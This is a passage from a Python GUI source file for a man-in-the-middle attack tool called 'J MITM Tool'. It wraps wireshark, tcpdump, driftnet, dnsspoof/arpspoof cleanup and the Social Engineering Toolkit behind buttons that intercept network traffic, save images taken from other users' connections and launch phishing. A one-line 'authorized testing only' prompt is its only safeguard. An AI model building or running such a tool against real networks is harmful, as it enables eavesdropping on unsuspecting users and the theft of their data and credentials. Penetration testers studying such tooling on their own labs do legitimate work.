        self.dns_status.set("Not active")
        self.log_message("DNS spoofing stopped")
    
    def start_wireshark(self):
        """Start Wireshark packet capture"""
        interface = self.interface_sniff.get()
        cmd = f"wireshark -i {interface} -k &"
        self.run_command(cmd, self.cmd_display_sniff)
    
    def start_tcpdump(self):
        """Start tcpdump packet capture"""
        interface = self.interface_sniff.get()
        filter_str = self.capture_filter.get()
        cmd = f"tcpdump -i {interface} {filter_str} -w /tmp/jmitm_capture.pcap &"
        self.run_command(cmd, self.cmd_display_sniff)
    
    def stop_packet_capture(self):
        """Stop packet capture processes"""
        self.run_command("pkill -f wireshark", self.cmd_display_sniff)
        self.run_command("pkill -f tcpdump", self.cmd_display_sniff)
        self.log_message("Packet capture stopped")
    
    def browse_image_dir(self):
        """Browse for image directory"""
        directory = filedialog.askdirectory()
        if directory:
            self.image_dir.delete(0, tk.END)
            self.image_dir.insert(0, directory)
    
    def start_driftnet(self):
        """Start driftnet image capture"""
        interface = self.driftnet_interface.get()
        directory = self.image_dir.get()
        
        # Create directory if it doesn't exist
        os.makedirs(directory, exist_ok=True)
        
        cmd = f"driftnet -i {interface} -d {directory} &"
        self.run_command(cmd, self.cmd_display_driftnet)
        self.driftnet_status.set("Active - Capturing images")
        self.driftnet_active = True
        self.log_message(f"Driftnet started, saving images to {directory}")
    
    def stop_driftnet(self):
        """Stop driftnet image capture"""
        self.run_command("pkill -f driftnet", self.cmd_display_driftnet)
        self.driftnet_status.set("Not active")
        self.driftnet_active = False
        self.log_message("Driftnet stopped")
    
    def view_captured_images(self):
        """View captured images"""
        directory = self.image_dir.get()
        cmd = f"xdg-open {directory} &"
        self.run_command(cmd, self.cmd_display_driftnet)
    
    def start_setoolkit(self):
        """Start Social Engineering Toolkit"""
        cmd = "setoolkit"
        self.run_command(cmd, self.cmd_display_set)
        self.log_message("SEToolkit started - Follow on-screen instructions")
    
    def stop_setoolkit(self):
        """Stop SEToolkit"""
        self.run_command("pkill -f setoolkit", self.cmd_display_set)
        self.log_message("SEToolkit stopped")
    
    def on_closing(self):
        """Cleanup when closing the application"""
        self.log_message("Shutting down J MITM Tool - J Project Platform")
        self.stop_arp_spoofing()
        self.root.destroy()

def check_dependencies():
    """Check if required tools are installed"""
    required_tools = [
        "arpspoof", "dnsspoof", "driftnet", "nmap", "netdiscover", 
        "tcpdump", "wireshark", "setoolkit", "arp-scan"
    ]
    
    missing_tools = []
    for tool in required_tools:
        try:
            subprocess.run(["which", tool], capture_output=True, check=True)
        except subprocess.CalledProcessError:
            missing_tools.append(tool)
    
    return missing_tools

def main():
    # Check if running as root
    if os.geteuid() != 0:
        print("ERROR: J MITM Tool requires root privileges!")
        print("Please run with: sudo python3 j-mitm.py")
        sys.exit(1)
    
    # Check dependencies
    missing = check_dependencies()
    if missing:
        print("J MITM - Missing dependencies:")
        for tool in missing:
            print(f"  - {tool}")
        print("\nInstall with: sudo apt install dsniff driftnet nmap wireshark setoolkit arp-scan")
        response = input("Continue anyway? (y/N): ")
        if response.lower() != 'y':
            sys.exit(1)
    
    # Legal warning with J Project branding
    print("\n" + "="*70)
    print("🛡️  J MITM TOOL - J PROJECT PLATFORM")
    print("="*70)
    print("Created by: jh4ck3r")
    print("Platform: J Project Platform")
    print("Website: https://jprojectplatform.com/")
    print("="*70)
    print("This tool is for EDUCATIONAL and AUTHORIZED testing ONLY.")
    print("="*70)
    response = input("Do you have proper authorization? (y/N): ")
    if response.lower() != 'y':
        print("Exiting J MITM Tool...")
        sys.exit(0)
    
    root = tk.Tk()
    app = JMITMAttackGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()